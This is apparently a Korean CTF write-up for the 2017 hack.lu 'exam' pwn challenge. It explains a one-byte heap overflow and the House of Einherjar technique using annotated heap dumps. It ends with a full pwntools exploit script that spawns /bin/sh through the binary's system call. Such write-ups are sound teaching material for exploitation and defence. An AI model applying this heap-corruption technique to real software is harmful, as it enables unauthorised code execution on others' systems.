# 2017 hack.lu - [PWN] exam

## Key words

- x86_64 ELF
- House of Einherjar

## Solution

문제 내용을 간단히 하면 다음과 같습니다.

```
1. 할당
  - 0x88 사이즈 동적 할당
  - 처음 8 바이트는 정적 스트링
  - 두 번째 0x80바이트는 사용자 입력 스트림
2. 해제
  - index를 입력 받고 해당 동적 할당 인덱스 해제 (folder 글로벌 변수에서 관리)
  - 해제 후, 주소는 0으로 초기화
3. 출력
  - index를 입력 받고 해당 동적 할당 인덱스에 대한 스트링 출력
  - 본 문제 해결에서는 사용되지 않음
4. 병합
  - 할당된 사이즈의 4의 배수가 되는 스트링들을 모아서 할당
  - ex) 0x80 할당 => [::4] = 0x20 할당
5. 시험 (exam)
  - 첫 8바이트가 "ITSMAGIC" 이라면 [8:] 의 스트링을 system 인자로 넣어줌
```

할당은 고정적으로 `0x88`씩 할당이 되며 총 5개 까지 할당이 가능합니다. 또 다른 할당으로는 병합시, `crib`변수에 할당이 되는데 이는 `0x88`로 할당된 스트링을 4로 나눈 값의 크기로 할당이 됩니다. (유동적 사이즈)

문제를 해결하기 위해선 유동적으로 할당할 수 있는 `crib`를 이용하여 `0x88`로 할당되는 오브젝트의 첫 8바이트를 `ITSMAGIC`으로 변경하여 시스템을 호출하는 것 입니다.

한 가지, 발생될 수 있는 버그는 사용자의 입력을 받는 `get_line` 함수 입니다.

```c
__int64 __fastcall get_line(void *buf, unsigned __int64 arg_len)
{
  void *p_buf; // rbx@1
  unsigned __int64 idx; // rbp@1
  __int64 result; // rax@2

  p_buf = buf;
  idx = 0LL;
  while ( 1 )
  {
    result = read(0, p_buf, 1uLL);
    if ( result == -1 )
      exit(-1);
    if ( *(_BYTE *)p_buf == 10 )
      break;
    ++idx;
    p_buf = (char *)p_buf + 1;
    if ( arg_len < idx )
      goto LABEL_5;
  }
  *(_BYTE *)p_buf = 0;
  if ( arg_len <= idx )
LABEL_5:
    *((_BYTE *)buf + idx) = 0;
  return result;
}
```

이 함수에서는 `arg_len`으로 입력을 넣으면 최대 `arg_len+1`까지 입력이 가능하여 1바이트 오버플로우가 발생됩니다.

이렇게 한 바이트 오버플로우가 발생되어 다음 청크의 `size + (prev_inuse)`를 조작할 수 있다면 `House of Einherjar` 기술을 이용하여 재미있는 결과를 만들 수 있습니다.

`House of Einherjar`의 기본 아이디어는 특정 청크 `X`가 해제 될 때 `SIZE`에 있는 `PREV_INUSE`비트가 0 이라면 이전 청크가 해제 되었음을 의미하기 때문에 `PREV_SIZE`를 보고 이전 청크의 위치를 계산하여 두 개의 청크를 병합을 하는 것을 이용합니다. `PREV_SIZE`가 조작이 가능하다면 이전 청크를 병합 하는 것이 아닌 이전, 이전, 이전 ... 청크를 기준으로 병합을 시킬 수 있습니다.

예로 3개의 `0x88` (size 0x90) 3개(X, Y, Z)를 할당했다고 가정하면 다음과 같이 할당이 되게 됩니다.

```
# X
0x0000    |            |    PREV_SIZE
0x0008    |          91|    SIZE
0x0010    |            |    BUFFER
...
# Y
0x0090    |          90|    PREV_SIZE    
0x00a0    |          91|    SIZE
0x00b0    |            |    BUFFER
...
# Z
0x0120    |          90|    PREV_SIZE    
0x0130    |          91|    SIZE
0x0140    |            |    BUFFER
```

이 때, 한 바이트 오버플로우를 이용하면, `Y` 청크를 이용하여 `Z`청크의 `PREV_SIZE`와 `SIZE`의 처음 1바이트를 수정하여 `PREV_INUSE`까지 변경 가능합니다.

```
# X
0x0000    |            |    PREV_SIZE
0x0008    |          91|    SIZE
0x0010    |            |    BUFFER
...
# Y
0x0090    |          90|    PREV_SIZE    
0x00a0    |          91|    SIZE
0x00b0    |            |    BUFFER
...
# Z
0x0120    |         120|    PREV_SIZE  (0x90 -> 0x120)  
0x0130    |          90|    SIZE       (0x91 -> 0x91)
0x0140    |            |    BUFFER
```

이렇게 만들고 `Z` 객체를 해제하면 `Z`의 `SIZE` 내부에 있는 `PREV_INUSE`가 0 이기 때문에 이전 청크가 해제 되었다고 생각하고 이전 청크와 병합을 시도 합니다. 이 때, 이전 청크의 위치는 (현재 위치 - PREV_SIZE)를 통해 이루어 지는데 `Y`를 이용하여 `PREV_SIZE`를 변경했기 때문에 `Z`의 이전 청크가 `Y`를 가리키지 않고 `X`를 가리키게 됩니다.

```
이전 청크 위치
= (Z 주소) - Z.PREV_SIZE
= 0x120 - 0x120
= 0
```

`X`와 `Z`가 병합되는 바람에 중간에 있는 `Y` 객체 (할당되어 있는 객체)를 무시하고 병합을 해버려서 `top chunk`가 X에 위치하게 됩니다.

```
# X
0x0000    |            |    PREV_SIZE
0x0008    | top chunk  |    SIZE
0x0010    |            |    BUFFER
...
# Y
0x0090    |          90|    PREV_SIZE    
0x00a0    |          91|    SIZE
0x00b0    |            |    BUFFER
...
# Z
0x0120    |         120|    PREV_SIZE  (0x90 -> 0x120)  
0x0130    |          90|    SIZE       (0x91 -> 0x91)
0x0140    |            |    BUFFER
```

몇 가지 추가적인 조건으로는 청크가 `unsorted bin`이여야 하며 `unsorted bin`은 병합 전에 `unlink`과정을 거치는데 이 부분의 `sanity check`도 모두 만족을 해야 합니다.

이제 아인헤랴르를 이용하여 문제를 풀기 위한 아이디어는 다음과 같습니다.

```
할당 (0x88) - "A"*8, malloc(0x88)  --- (A)
crib 할당   - 0x20 , malloc(0x20)  --- (B)
할당 (0x88) - "B"*8, malloc(0x88)  --- (C)
할당 (0x88) - "B"*8, malloc(0x88)  --- (D)
```

각각의 오브젝트를 A, B, C, D로 가정하면 최종 목표는 A~D를 병합 시키고 B를 이용하여 C의 첫 8바이트를 `ITSMAGIC`으로 덮고 뒤에 시스템 명령을 넣는 것 입니다.

먼저, A, B, C, D를 모두 할당하면 다음과 같습니다.

```
*** 0x555555757000 : alloc ***
555555757000  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│ <-- A
555555757010  49 54 53 53  54 55 44 59  41 41 41 41  41 41 41 41  │ITSS│TUDY│AAAA│AAAA│
555555757020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757060  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757080  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757090  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │····│····│!···│····│ <-- B (crib)
5555557570a0  41 41 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │AA··│····│····│····│
5555557570b0  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│ <-- C
5555557570c0  49 54 53 53  54 55 44 59  42 42 42 42  42 42 42 42  │ITSS│TUDY│BBBB│BBBB│
5555557570d0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557570e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557570f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757100  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757110  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757120  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757130  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757140  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│ <-- D
555555757150  49 54 53 53  54 55 44 59  43 43 43 43  43 43 43 43  │ITSS│TUDY│CCCC│CCCC│
555555757160  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757170  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757180  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757190  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571a0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571d0  00 00 00 00  00 00 00 00  31 0e 02 00  00 00 00 00  │····│····│1···│····│
5555557571e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757200

*** 0x555555756040 : g_folder ***
555555756040  10 70 75 55  55 55 00 00  c0 70 75 55  55 55 00 00  │·puU│UU··│·puU│UU··│
555555756050  50 71 75 55  55 55 00 00  00 00 00 00  00 00 00 00  │PquU│UU··│····│····│
555555756060  00 00 00 00  00 00 00 00  a0 70 75 55  55 55 00 00  │····│····│·puU│UU··│
555555756070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555756080
```

그리고 `C`를 해제 하고 다시 할당하여  `D`의 `PREV_SIZE`와 `PREV_INUSE`를 수정합니다.

```
*** 0x555555757000 : free(C) ***
555555757000  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│ <-- A
555555757010  49 54 53 53  54 55 44 59  41 41 41 41  41 41 41 41  │ITSS│TUDY│AAAA│AAAA│
555555757020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757060  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757080  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757090  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │····│····│!···│····│ <-- B (crib)
5555557570a0  41 41 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │AA··│····│····│····│
5555557570b0  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│
5555557570c0  78 1b dd f7  ff 7f 00 00  78 1b dd f7  ff 7f 00 00  │x···│····│x···│····│ <-- C (free)
5555557570d0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557570e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557570f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757100  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757110  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757120  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757130  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757140  90 00 00 00  00 00 00 00  90 00 00 00  00 00 00 00  │····│····│····│····│ <-- D
555555757150  49 54 53 53  54 55 44 59  43 43 43 43  43 43 43 43  │ITSS│TUDY│CCCC│CCCC│
555555757160  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757170  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757180  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757190  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571a0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571d0  00 00 00 00  00 00 00 00  31 0e 02 00  00 00 00 00  │····│····│1···│····│
5555557571e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757200

*** 0x555555756040 : g_folder ***
555555756040  10 70 75 55  55 55 00 00  00 00 00 00  00 00 00 00  │·puU│UU··│····│····│
555555756050  50 71 75 55  55 55 00 00  00 00 00 00  00 00 00 00  │PquU│UU··│····│····│
555555756060  00 00 00 00  00 00 00 00  a0 70 75 55  55 55 00 00  │····│····│·puU│UU··│
555555756070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555756080
```

오버플로우를 이용하여 덮으면 다음과 같습니다.

```
*** 0x555555757000 : add(payload) ***
555555757000  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│ <-- A
555555757010  49 54 53 53  54 55 44 59  41 41 41 41  41 41 41 41  │ITSS│TUDY│AAAA│AAAA│
555555757020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757060  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757080  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757090  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │····│····│!···│····│ <-- B
5555557570a0  41 41 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │AA··│····│····│····│
5555557570b0  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│ <-- C (alloc again)
5555557570c0  49 54 53 53  54 55 44 59  45 45 45 45  45 45 45 45  │ITSS│TUDY│EEEE│EEEE│
5555557570d0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
5555557570e0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
5555557570f0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757100  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757110  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757120  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757130  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757140  40 01 00 00  00 00 00 00  90 00 00 00  00 00 00 00  │@···│····│····│····│ <-- D (changed PREV_SIZE, PREV_INUSE)
555555757150  49 54 53 53  54 55 44 59  43 43 43 43  43 43 43 43  │ITSS│TUDY│CCCC│CCCC│
555555757160  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757170  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757180  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757190  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571a0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571d0  00 00 00 00  00 00 00 00  31 0e 02 00  00 00 00 00  │····│····│1···│····│
5555557571e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757200

*** 0x555555756040 : g_folder ***
555555756040  10 70 75 55  55 55 00 00  c0 70 75 55  55 55 00 00  │·puU│UU··│·puU│UU··│
555555756050  50 71 75 55  55 55 00 00  00 00 00 00  00 00 00 00  │PquU│UU··│····│····│
555555756060  00 00 00 00  00 00 00 00  a0 70 75 55  55 55 00 00  │····│····│·puU│UU··│
555555756070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
```

이후, `A`를 먼저 해제하고 (unlink sanity check) `D`를 해제 하게 되면 glibc는 `A`부터 `D`까지 병합을 해야 한다고 생각하고 병합을 진행합니다.

```
*** 0x555555757000 : free(A) ***
555555757000  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│ <-- A (free)
555555757010  78 1b dd f7  ff 7f 00 00  78 1b dd f7  ff 7f 00 00  │x···│····│x···│····│
555555757020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757060  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757080  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757090  90 00 00 00  00 00 00 00  20 00 00 00  00 00 00 00  │····│····│ ···│····│ <-- B (crib)
5555557570a0  41 41 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │AA··│····│····│····│
5555557570b0  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│
5555557570c0  49 54 53 53  54 55 44 59  45 45 45 45  45 45 45 45  │ITSS│TUDY│EEEE│EEEE│ <-- C
5555557570d0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
5555557570e0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
5555557570f0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757100  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757110  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757120  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757130  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757140  40 01 00 00  00 00 00 00  90 00 00 00  00 00 00 00  │@···│····│····│····│ <-- D
555555757150  49 54 53 53  54 55 44 59  43 43 43 43  43 43 43 43  │ITSS│TUDY│CCCC│CCCC│
555555757160  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757170  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757180  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757190  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571a0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571d0  00 00 00 00  00 00 00 00  31 0e 02 00  00 00 00 00  │····│····│1···│····│
5555557571e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757200
*** 0x555555756040 : g_folder ***
555555756040  00 00 00 00  00 00 00 00  c0 70 75 55  55 55 00 00  │····│····│·puU│UU··│
555555756050  50 71 75 55  55 55 00 00  00 00 00 00  00 00 00 00  │PquU│UU··│····│····│
555555756060  00 00 00 00  00 00 00 00  a0 70 75 55  55 55 00 00  │····│····│·puU│UU··│
555555756070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555756080


*** 0x555555757000 : free(D) ***
555555757000  00 00 00 00  00 00 00 00  01 10 02 00  00 00 00 00  │····│····│····│····│ <-- A (free)
555555757010  78 1b dd f7  ff 7f 00 00  78 1b dd f7  ff 7f 00 00  │x···│····│x···│····│
555555757020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757060  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757080  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757090  90 00 00 00  00 00 00 00  20 00 00 00  00 00 00 00  │····│····│ ···│····│ <-- B (crib)
5555557570a0  41 41 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │AA··│····│····│····│
5555557570b0  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│
5555557570c0  49 54 53 53  54 55 44 59  45 45 45 45  45 45 45 45  │ITSS│TUDY│EEEE│EEEE│ <-- C
5555557570d0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
5555557570e0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
5555557570f0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757100  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757110  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757120  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757130  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757140  40 01 00 00  00 00 00 00  90 00 00 00  00 00 00 00  │@···│····│····│····│ <-- D (free)
555555757150  49 54 53 53  54 55 44 59  43 43 43 43  43 43 43 43  │ITSS│TUDY│CCCC│CCCC│
555555757160  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757170  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757180  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757190  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571a0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571d0  00 00 00 00  00 00 00 00  31 0e 02 00  00 00 00 00  │····│····│1···│····│
5555557571e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
5555557571f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757200
*** 0x555555756040 : g_folder ***
555555756040  00 00 00 00  00 00 00 00  c0 70 75 55  55 55 00 00  │····│····│·puU│UU··│
555555756050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555756060  00 00 00 00  00 00 00 00  a0 70 75 55  55 55 00 00  │····│····│·puU│UU··│
555555756070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555756080
```

위를 보시면 `C`가 아직 할당되어 있음에도 불구하고 탑 청크가 `A`에 위치해 있음을 볼 수 있습니다. `C` 오브젝트를 덮으려면 2번을 할당해야 하니 한번은 더미로 할당하고 그 다음 오브젝트를 이용하여 `C`를 덮고 `exam`메뉴를 통해 시스템을 실행 할 수 있습니다.

## Solution Code

```python
from pwn import *

def add(msg):
	r.sendline("1")
	print r.recv()

	if len(msg) < 0x80:
		r.sendline(msg)
	else:
		r.send(msg)
	print r.recv()

def free(idx):
	r.sendline("2")
	print r.recv()

	r.sendline(str(idx))
	print r.recv()

def create_crib():
	r.sendline("4")
	print r.recvuntil("\n> ")

def exam(idx):
	r.sendline("6")
	print r.recv()

	r.sendline(str(idx))
	print r.recv()

	r.interactive()

def leak(addr, size, title=""):
	print "*** {} : {} ***".format(hex(addr), title)
	print hexdump(r.leak(addr, size), begin=addr, skip=False)

target = "./exam"

r = process(target)

l_heap = 0x555555757000
l_code = 0x555555554000
l_folder = l_code + 0x202040

print r.recv()

add("A"*8)    # A
create_crib() # B
add("B"*8)    # C
add("C"*8)    # D

leak(l_heap, 0x200, "alloc")
leak(l_folder, 0x40, "g_folder")

free(1)
leak(l_heap, 0x200, "free(C)")
leak(l_folder, 0x40, "g_folder")

payload = "E"*0x78 + p64(0x140) + "\x90"
add(payload)
leak(l_heap, 0x200, "add(payload)")
leak(l_folder, 0x40, "g_folder")

free(0)
leak(l_heap, 0x200, "free(A)")
leak(l_folder, 0x40, "g_folder")

free(2)
leak(l_heap, 0x200, "free(D)")
leak(l_folder, 0x40, "g_folder")

add("F"*8)
leak(l_heap, 0x200, "add(F*8)")
leak(l_folder, 0x40, "g_folder")

payload = "G" * 0x18
payload += "ITSMAGIC"
payload += "/bin/sh\x00"
add(payload)
leak(l_heap, 0x200, "add(payload(2))")
leak(l_folder, 0x40, "g_folder")

exam(1)
```

## Result

```
hackability@ubuntu:~/ctfing/2017_hacklu/pwn/exam$ python sol_exam.py
[+] Starting local process './exam': pid 15465

<...snip...>
*** 0x555555757000 : add(payload(2)) ***
555555757000  00 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│
555555757010  49 54 53 53  54 55 44 59  46 46 46 46  46 46 46 46  │ITSS│TUDY│FFFF│FFFF│
555555757020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757060  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757080  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757090  90 00 00 00  00 00 00 00  91 00 00 00  00 00 00 00  │····│····│····│····│
5555557570a0  49 54 53 53  54 55 44 59  47 47 47 47  47 47 47 47  │ITSS│TUDY│GGGG│GGGG│
5555557570b0  47 47 47 47  47 47 47 47  47 47 47 47  47 47 47 47  │GGGG│GGGG│GGGG│GGGG│
5555557570c0  49 54 53 4d  41 47 49 43  2f 62 69 6e  2f 73 68 00  │ITSM│AGIC│/bin│/sh·│
5555557570d0  00 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │·EEE│EEEE│EEEE│EEEE│
5555557570e0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
5555557570f0  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757100  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757110  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757120  45 45 45 45  45 45 45 45  e1 0e 02 00  00 00 00 00  │EEEE│EEEE│····│····│
555555757130  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
555555757140  40 01 00 00  00 00 00 00  90 00 00 00  00 00 00 00  │@···│····│····│····│
555555757150  49 54 53 53  54 55 44 59  43 43 43 43  43 43 43 43  │ITSS│TUDY│CCCC│CCCC│
555555757160  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757170  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757180  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
555555757190  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
